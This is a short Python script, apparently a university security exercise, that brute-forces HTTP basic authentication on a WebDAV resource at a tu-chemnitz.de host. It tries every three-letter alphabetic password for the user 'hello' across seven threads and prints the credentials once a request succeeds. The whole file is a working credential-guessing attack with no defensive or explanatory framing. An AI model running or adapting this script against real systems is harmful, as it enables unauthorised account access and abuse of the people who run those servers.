from threading import Thread
import requests, sys, itertools, queue

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
chars = list(chars)

perms = itertools.product(chars, repeat=3)
perms = ["".join(x) for x in perms]
user = "hello"
q = queue.Queue()
for p in perms:
    q.put(p)
found = False

def run():
    global found
    while not q.empty():
        if found is True:
            sys.exit()
        pw = q.get()
        print(pw)
        try:
            r = requests.get("http://pauline.informatik.tu-chemnitz.de/webdav_http_basic/secret.jpg", auth=(user, pw))
            if r.status_code == 200:
                print("FOUND login credentials: " + user + ", " + pw)
                found = True
                sys.exit()
        except Exception as e:
            print(e)

for i in range(0, 7):
    worker = Thread(target=run)
    worker.start()









